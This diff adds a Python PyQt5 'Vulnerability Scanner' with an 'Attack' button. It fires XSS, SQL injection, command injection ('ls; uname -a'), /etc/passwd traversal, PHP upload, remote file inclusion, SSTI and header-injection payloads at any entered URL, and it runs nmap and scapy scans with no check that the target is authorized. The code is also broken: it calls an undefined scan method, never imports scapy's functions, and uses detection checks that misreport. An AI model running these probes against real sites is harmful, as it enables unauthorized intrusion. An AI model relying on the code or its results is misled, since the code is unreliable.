@@ -1,0 +1,670 @@
+"""
+
+⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿
+⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⣿
+⣿⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⣿
+⣿⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⣿
+⣿⠄⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿
+⣿⠄⠄⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿
+⣿⠄⠄⠄⠄⠄⠄⣿⣿⣿⠄⠄⣿⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⠄⠄⠄⠄⠄⣿⠄⠄⠄⣿⣿⠄⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿
+⠄⣿⠄⠄⠄⣿⠄⠄⠄⣿⣿⠄⠄⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿
+⠄⠄⣿⠄⠄⣿⠄⠄⣿⠄⠄⠄⣿⠄⠄⠄⠄⠄⣿⠄⠄⠄⣿⣿⣿⣿⠄⣿
+⠄⠄⠄⣿⠄⣿⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⠄⣿
+⣿⣿⣿⠄⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⣿
+⣿⠄⠄⠄⣿⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⠄⠄⠄⠄⣿⠄⠄⣿
+⠄⣿⠄⠄⠄⣿⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿
+⠄⠄⣿⠄⠄⣿⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿
+⠄⠄⠄⣿⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿
+⠄⠄⠄⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⠄⠄⠄⣿
+⠄⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⣿⠄⠄⠄⣿
+⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⠄⣿⣿⣿⣿
+⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿
+⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿
+⠄⠄⣿⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⣿
+⠄⠄⠄⣿⠄⠄⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⠄⠄⠄⠄⣿
+⠄⠄⠄⣿⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⠄⣿⣿
+⠄⠄⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿
+
+
+Hello, I am s3loc, thank you for your praise and criticism.
+
+I'm still developing, I can't wait for you to help me.
+
+You can use this tool I wrote in your own projects and works.
+
+
+
+
+"""
+
+
+
+
+
+
+
+
+
+
+
+
+
+import sys
+import requests
+from bs4 import BeautifulSoup
+from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
+                             QProgressBar, QTextEdit, QLineEdit, QMessageBox, QMenu, QAction)
+from PyQt5.QtGui import QFont, QContextMenuEvent, QCursor
+from PyQt5.QtCore import QThread, pyqtSignal, Qt
+from urllib.parse import urljoin
+
+import nmap  # Nmap modülü eklenmiştir
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle('Vulnerability Scanner')
+        self.setGeometry(100, 100, 900, 700)
+        self.setStyleSheet("background-color: #1e1e1e; color: #e0e0e0;")
+        self.worker = ScanWorker()  # ScanWorker sınıfını tanımladığınızı varsayıyorum
+        self.worker.finished.connect(self.scan_finished)
+        self.worker.progress.connect(self.update_progress)
+        self.setCentralWidget(self.create_main_layout())
+
+    def create_main_layout(self):
+        main_layout = QVBoxLayout()
+
+        # Başlık etiketini oluştur ve stil ver
+        title_label = QLabel('Vulnerability Scanner')
+        title_label.setFont(QFont('Arial', 22, QFont.Bold))
+        title_label.setStyleSheet("""
+            color: #ff5722;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+        """)
+        main_layout.addWidget(title_label, alignment=Qt.AlignCenter)
+
+        # URL girişi için düzeni oluştur
+        url_layout = QHBoxLayout()
+
+        # URL etiketini oluştur ve stil ver
+        url_label = QLabel('Enter Target URL:')
+        url_label.setFont(QFont('Arial', 16))
+        url_label.setStyleSheet("""
+            color: #e0e0e0;
+            margin-right: 10px;
+            padding: 5px;
+        """)
+        url_layout.addWidget(url_label)
+
+        # URL giriş kutusunu oluştur ve stil ver
+        self.url_input = QLineEdit()
+        self.url_input.setPlaceholderText('http://example.com')
+        self.url_input.setStyleSheet("""
+            QLineEdit {
+                border: 2px solid #444;
+                border-radius: 8px;
+                padding: 10px;
+                font-size: 16px;
+                background-color: #333;
+                color: #e0e0e0;
+                selection-background-color: #ff5722;
+                selection-color: #ffffff;
+                transition: border-color 0.3s ease, background-color 0.3s ease;
+            }
+            QLineEdit:focus {
+                border-color: #ff5722;
+                background-color: #2e2e2e;
+            }
+        """)
+        url_layout.addWidget(self.url_input)
+
+        # Butonları oluştur
+        self.attack_button = self.create_button('Attack', self.start_attack)
+        self.scan_button = self.create_button('Scan', self.start_scan)
+        self.reset_button = self.create_button('Reset', self.reset_fields)
+        self.exit_button = self.create_button('Exit', self.close_application)
+
+        # Butonları düzen içinde ekle
+        button_layout = QHBoxLayout()
+        button_layout.addWidget(self.attack_button)
+        button_layout.addWidget(self.scan_button)
+        button_layout.addWidget(self.reset_button)
+        button_layout.addWidget(self.exit_button)
+
+        # URL düzenini ana düzenin içine ekle
+        main_layout.addLayout(url_layout)
+        main_layout.addLayout(button_layout)
+
+        # İlerleme çubuğunu oluştur ve stil ver
+        self.progress_bar = QProgressBar()
+        self.progress_bar.setMinimum(0)
+        self.progress_bar.setMaximum(100)
+        self.progress_bar.setValue(0)
+        self.progress_bar.setStyleSheet("""
+            QProgressBar {
+                border: 2px solid #555;
+                border-radius: 10px;
+                text-align: center;
+                background-color: #1e1e1e;
+                padding: 3px;
+            }
+            QProgressBar::chunk {
+                background: #ff5722;
+                width: 20px;
+                border-radius: 5px;
+            }
+        """)
+        main_layout.addWidget(self.progress_bar)
+
+        # Sonuçları gösteren metin kutusunu oluştur
+        results_label = QLabel('Results:')
+        results_label.setFont(QFont('Arial', 16))
+        results_label.setStyleSheet("color: #e0e0e0;")
+        main_layout.addWidget(results_label)
+
+        self.results_text = QTextEdit()
+        self.results_text.setStyleSheet("""
+            QTextEdit {
+                border: 1px solid #444;
+                border-radius: 8px;
+                padding: 10px;
+                font-size: 14px;
+                background-color: #1e1e1e;
+                color: #e0e0e0;
+                selection-background-color: #ff5722;
+                selection-color: #000;
+                outline: none;
+            }
+            QTextEdit:focus {
+                border: 1px solid #ff5722;
+                background-color: #333;
+            }
+        """)
+        main_layout.addWidget(self.results_text)
+
+        # Ana düzeni bir widget içine al ve döndür
+        container = QWidget()
+        container.setLayout(main_layout)
+        return container
+
+    def create_button(self, text, callback):
+        button = QPushButton(text)
+        button.clicked.connect(callback)
+        button.setStyleSheet("""
+            QPushButton {
+                background-color: #ff5722;
+                border: 2px solid #e64a19;
+                color: #ffffff;
+                padding: 12px 24px;
+                font-size: 16px;
+                border-radius: 8px;
+                transition: background-color 0.4s ease, box-shadow 0.4s ease, transform 0.2s ease;
+                box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.3);
+                font-weight: bold;
+                text-transform: uppercase;
+            }
+            QPushButton:hover {
+                background-color: #e64a19;
+                box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.4);
+                transform: scale(1.05);
+            }
+            QPushButton:pressed {
+                background-color: #d84315;
+                box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
+                transform: scale(0.95);
+            }
+        """)
+        return button
+
+    def reset_fields(self):
+        self.url_input.clear()
+        self.results_text.clear()
+        self.progress_bar.setValue(0)
+        self.attack_button.setEnabled(True)
+
+    def close_application(self):
+        QApplication.quit()
+
+    def contextMenuEvent(self, event):
+        context_menu = QMenu(self)
+        show_vulnerabilities_action = QAction('Show Vulnerabilities', self)
+        show_vulnerabilities_action.triggered.connect(self.show_vulnerabilities)
+        context_menu.addAction(show_vulnerabilities_action)
+        context_menu.exec_(QCursor.pos())
+
+    def show_vulnerabilities(self):
+        url = self.url_input.text().strip()
+        if not url.startswith('http'):
+            url = 'http://' + url
+
+        if not url:
+            QMessageBox.warning(self, 'Warning', 'URL cannot be empty!')
+            return
+
+        QMessageBox.information(self, 'Vulnerabilities', 'List of vulnerabilities for the URL will be displayed here.')
+
+    def start_attack(self):
+        url = self.url_input.text().strip()
+        if not url.startswith('http'):
+            url = 'http://' + url
+
+        if not url:
+            QMessageBox.warning(self, 'Warning', 'URL cannot be empty!')
+            return
+
+        self.attack_button.setEnabled(False)
+        self.results_text.clear()
+        self.progress_bar.setValue(0)
+
+        self.worker.set_url(url)
+        self.worker.start()
+
+    def start_scan(self):
+        self.start_attack()
+
+    def update_progress(self, value):
+        self.progress_bar.setValue(value)
+
+    def scan_finished(self, vulnerabilities):
+        self.attack_button.setEnabled(True)
+        self.display_results(vulnerabilities)
+
+    def display_results(self, vulnerabilities):
+        if vulnerabilities:
+            result_text = "Vulnerabilities found:\n\n"
+            for vuln in vulnerabilities:
+                result_text += f"Vulnerability Type: {vuln['Vulnerability Type']}\n"
+                result_text += f"Target URL: {vuln['Target URL']}\n"
+                result_text += f"Details:\n"
+                result_text += f"  Payload: {vuln.get('Payload', '')}\n"
+                result_text += f"  Response:\n{vuln['Response']}\n\n"
+        else:
+            result_text = "No vulnerabilities found."
+
+        self.results_text.setPlainText(result_text)
+
+
+class ScanWorker(QThread):
+    finished = pyqtSignal(list)
+    progress = pyqtSignal(int)
+
+    def __init__(self):
+        super().__init__()
+        self.url = ""
+
+    def set_url(self, url):
+        self.url = url
+
+    def run(self):
+        vulnerabilities = []
+        try:
+            response = requests.get(self.url)
+            response.raise_for_status()
+            soup = BeautifulSoup(response.text, 'html.parser')
+            forms = soup.find_all('form')
+
+            total_forms = len(forms)
+            if total_forms == 0:
+                self.progress.emit(100)
+                self.finished.emit(vulnerabilities)
+                return
+
+            for i, form in enumerate(forms):
+                form_details = self.get_form_details(form)
+                self.check_vulnerabilities(form_details, vulnerabilities)
+                progress = int((i + 1) / total_forms * 100)
+                self.progress.emit(progress)
+
+            # Nmap Taraması Başlat
+            self.run_nmap_scan(vulnerabilities)
+
+            self.progress.emit(100)
+            self.finished.emit(vulnerabilities)
+        except requests.RequestException as e:
+            self.progress.emit(100)
+            self.finished.emit([{'Vulnerability Type': 'Error', 'Target URL': self.url, 'Response': str(e)}])
+
+    def get_form_details(self, form):
+        details = {}
+        details['method'] = form.get('method', 'GET').upper()
+        details['action'] = form.get('action', '')
+        details['inputs'] = [{'name': input.get('name', ''), 'type': input.get('type', 'text')} for input in
+                             form.find_all('input')]
+        return details
+
+    def check_vulnerabilities(self, form_details, vulnerabilities):
+        base_url = self.url
+        if not base_url.endswith('/'):
+            base_url += '/'
+
+        action_url = urljoin(base_url, form_details['action'])
+        test_payload = {'test': 'test'}
+
+        # Testlerin listesi
+        self.check_session_fixation(action_url, form_details, test_payload, vulnerabilities)
+        self.check_xss(action_url, form_details, test_payload, vulnerabilities)
+        self.check_sql_injection(action_url, form_details, test_payload, vulnerabilities)
+        self.check_command_injection(action_url, form_details, test_payload, vulnerabilities)
+        self.check_csrf(action_url, form_details, test_payload, vulnerabilities)
+        self.check_file_upload(action_url, form_details, test_payload, vulnerabilities)
+        self.check_directory_traversal(action_url, form_details, test_payload, vulnerabilities)
+        self.check_lfi(action_url, form_details, test_payload, vulnerabilities)
+        self.check_rfi(action_url, form_details, test_payload, vulnerabilities)
+        self.check_ssti(action_url, form_details, test_payload, vulnerabilities)
+        self.check_insecure_deserialization(action_url, form_details, test_payload, vulnerabilities)
+        self.check_http_response_splitting(action_url, form_details, test_payload, vulnerabilities)
+
+    def check_xss(self, url, form_details, payload, vulnerabilities):
+        xss_payload = "<script>alert('XSS');</script>"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = xss_payload
+
+        response = requests.post(url, data=payload)
+        if xss_payload in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Cross-Site Scripting (XSS)',
+                'Target URL': url,
+                'Payload': xss_payload,
+                'Response': response.text
+            })
+
+    def check_sql_injection(self, url, form_details, payload, vulnerabilities):
+        sql_payload = "' OR '1'='1"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = sql_payload
+
+        response = requests.post(url, data=payload)
+        if "syntax" in response.text.lower() or "error" in response.text.lower():
+            vulnerabilities.append({
+                'Vulnerability Type': 'SQL Injection',
+                'Target URL': url,
+                'Payload': sql_payload,
+                'Response': response.text
+            })
+
+    def check_command_injection(self, url, form_details, payload, vulnerabilities):
+        cmd_payload = "ls; uname -a"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = cmd_payload
+
+        response = requests.post(url, data=payload)
+        if "Linux" in response.text or "Windows" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Command Injection',
+                'Target URL': url,
+                'Payload': cmd_payload,
+                'Response': response.text
+            })
+
+    def check_csrf(self, url, form_details, payload, vulnerabilities):
+        response = requests.post(url, data=payload)
+        if "csrf" not in response.text.lower() and "cross-site request forgery" not in response.text.lower():
+            vulnerabilities.append({
+                'Vulnerability Type': 'CSRF',
+                'Target URL': url,
+                'Payload': payload,
+                'Response': response.text
+            })
+
+    def check_file_upload(self, url, form_details, payload, vulnerabilities):
+        # Basit bir zararlı dosya yükleme testi
+        file_payload = {'file': ('test.php', '<?php echo "Vulnerable"; ?>')}
+        response = requests.post(url, files=file_payload)
+        if "Vulnerable" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'File Upload Vulnerability',
+                'Target URL': url,
+                'Payload': file_payload,
+                'Response': response.text
+            })
+
+    def check_directory_traversal(self, url, form_details, payload, vulnerabilities):
+        traversal_payload = "../../../../etc/passwd"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = traversal_payload
+
+        response = requests.post(url, data=payload)
+        if "root:" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Directory Traversal',
+                'Target URL': url,
+                'Payload': traversal_payload,
+                'Response': response.text
+            })
+
+    def check_lfi(self, url, form_details, payload, vulnerabilities):
+        lfi_payload = "../../../../etc/passwd"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = lfi_payload
+
+        response = requests.post(url, data=payload)
+        if "root:" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Local File Inclusion (LFI)',
+                'Target URL': url,
+                'Payload': lfi_payload,
+                'Response': response.text
+            })
+
+    def check_rfi(self, url, form_details, payload, vulnerabilities):
+        rfi_payload = "http://example.com/malicious.txt"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = rfi_payload
+
+        response = requests.post(url, data=payload)
+        if "malicious content" in response.text.lower():
+            vulnerabilities.append({
+                'Vulnerability Type': 'Remote File Inclusion (RFI)',
+                'Target URL': url,
+                'Payload': rfi_payload,
+                'Response': response.text
+            })
+
+    def check_session_fixation(self, url, form_details, payload, vulnerabilities):
+        response = requests.post(url, data=payload)
+        if 'sessionid' in response.cookies.keys():
+            session_id_before = response.cookies['sessionid']
+            new_payload = {**payload, 'sessionid': session_id_before}
+            response = requests.post(url, data=new_payload)
+            session_id_after = response.cookies.get('sessionid', '')
+            if session_id_before == session_id_after:
+                vulnerabilities.append({
+                    'Vulnerability Type': 'Session Fixation',
+                    'Target URL': url,
+                    'Payload': new_payload,
+                    'Response': 'Session ID did not change after login'
+                })
+
+    def check_ssti(self, url, form_details, payload, vulnerabilities):
+        ssti_payload = "{{7*7}}"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = ssti_payload
+
+        response = requests.post(url, data=payload)
+        if "49" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Server-Side Template Injection (SSTI)',
+                'Target URL': url,
+                'Payload': ssti_payload,
+                'Response': response.text
+            })
+
+    def check_insecure_deserialization(self, url, form_details, payload, vulnerabilities):
+        deserialization_payload = "O:4:\"Test\":1:{s:4:\"data\";s:5:\"Test1\";}"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = deserialization_payload
+
+        response = requests.post(url, data=payload)
+        if "Test1" in response.text:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Insecure Deserialization',
+                'Target URL': url,
+                'Payload': deserialization_payload,
+                'Response': response.text
+            })
+
+    def check_http_response_splitting(self, url, form_details, payload, vulnerabilities):
+        response_splitting_payload = "test%0D%0ASet-Cookie:%20malicious=1"
+        for input_field in form_details['inputs']:
+            if input_field['type'] == 'text':
+                payload[input_field['name']] = response_splitting_payload
+
+        response = requests.post(url, data=payload)
+        if "malicious" in response.headers.get('Set-Cookie', ''):
+            vulnerabilities.append({
+                'Vulnerability Type': 'HTTP Response Splitting',
+                'Target URL': url,
+                'Payload': response_splitting_payload,
+                'Response': response.text
+            })
+
+
+class SecurityTester:
+    def __init__(self, url):
+        self.url = url
+
+    def run_advanced_nmap_scan(self, vulnerabilities):
+        nm = nmap.PortScanner()
+        target = self.url.replace("http://", "").replace("https://", "").split("/")[0]
+        try:
+            nm.scan(target, arguments='-sS -sV -O')
+        except Exception as e:
+            vulnerabilities.append({
+                'Vulnerability Type': 'Advanced Scan Error',
+                'Target URL': self.url,
+                'Response': str(e)
+            })
+            return
+
+        if 'hostscript' in nm[target]:
+            for script, output in nm[target]['hostscript'].items():
+                vulnerabilities.append({
+                    'Vulnerability Type': f'Advanced Scan - {script}',
+                    'Target URL': target,
+                    'Response': output
+                })
+
+    def run_http_header_scan(self, vulnerabilities):
+        nm = nmap.PortScanner()
+        target = self.url.replace("http://", "").replace("https://", "").split("/")[0]
+        try:
+            nm.scan(target, arguments='--script http-headers')
+        except Exception as e:
+            vulnerabilities.append({
+                'Vulnerability Type': 'HTTP Header Scan Error',
+                'Target URL': self.url,
+                'Response': str(e)
+            })
+            return
+
+        if 'hostscript' in nm[target]:
+            for script, output in nm[target]['hostscript'].items():
+                vulnerabilities.append({
+                    'Vulnerability Type': f'HTTP Header Scan - {script}',
+                    'Target URL': target,
+                    'Response': output
+                })
+
+    def run_sql_injection_scan(self, vulnerabilities):
+        nm = nmap.PortScanner()
+        target = self.url.replace("http://", "").replace("https://", "").split("/")[0]
+        try:
+            nm.scan(target, arguments='--script sql-injection')
+        except Exception as e:
+            vulnerabilities.append({
+                'Vulnerability Type': 'SQL Injection Scan Error',
+                'Target URL': self.url,
+                'Response': str(e)
+            })
+            return
+
+        if 'hostscript' in nm[target]:
+            for script, output in nm[target]['hostscript'].items():
+                vulnerabilities.append({
+                    'Vulnerability Type': f'SQL Injection Scan - {script}',
+                    'Target URL': target,
+                    'Response': output
+                })
+
+    def run_xss_scan(self, vulnerabilities):
+        nm = nmap.PortScanner()
+        target = self.url.replace("http://", "").replace("https://", "").split("/")[0]
+        try:
+            nm.scan(target, arguments='--script xss')
+        except Exception as e:
+            vulnerabilities.append({
+                'Vulnerability Type': 'XSS Scan Error',
+                'Target URL': self.url,
+                'Response': str(e)
+            })
+            return
+
+        if 'hostscript' in nm[target]:
+            for script, output in nm[target]['hostscript'].items():
+                vulnerabilities.append({
+                    'Vulnerability Type': f'XSS Scan - {script}',
+                    'Target URL': target,
+                    'Response': output
+                })
+
+    def run_tcp_port_scan(self, target_ip, port_range):
+        for port in port_range:
+            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
+            response = sr1(pkt, timeout=1, verbose=0)
+            if response:
+                if response.haslayer(TCP) and response[TCP].flags == 0x12:
+                    print(f"Port {port} is open")
+                elif response.haslayer(TCP) and response[TCP].flags == 0x14:
+                    print(f"Port {port} is closed")
+            else:
+                print(f"Port {port} is filtered or no response")
+
+    def run_icmp_echo_test(self, target_ip):
+        pkt = IP(dst=target_ip) / ICMP()
+        response = sr1(pkt, timeout=2, verbose=0)
+        if response:
+            print(f"{target_ip} is reachable")
+        else:
+            print(f"{target_ip} is not reachable")
+
+    def run_udp_port_scan(self, target_ip, port_range):
+        for port in port_range:
+            pkt = IP(dst=target_ip) / UDP(dport=port)
+            response = sr1(pkt, timeout=1, verbose=0)
+            if response:
+                print(f"Port {port} is open or filtered")
+            else:
+                print(f"Port {port} is closed or filtered")
+
+    def run_all_tests(self):
+        vulnerabilities = []
+        self.run_advanced_nmap_scan(vulnerabilities)
+        self.run_http_header_scan(vulnerabilities)
+        self.run_sql_injection_scan(vulnerabilities)
+        self.run_xss_scan(vulnerabilities)
+
+        # Örnek Scapy kullanım:
+        target_ip = "192.168.1.1"  # Hedef IP adresi
+        port_range = [22, 80, 443]  # Test edilecek portlar
+
+        self.run_tcp_port_scan(target_ip, port_range)
+        self.run_icmp_echo_test(target_ip)
+        self.run_udp_port_scan(target_ip, port_range)
+
+        return vulnerabilities
+
+if __name__ == '__main__':
+    app = QApplication(sys.argv)
+    window = MainWindow()
+    window.show()
+    sys.exit(app.exec_())
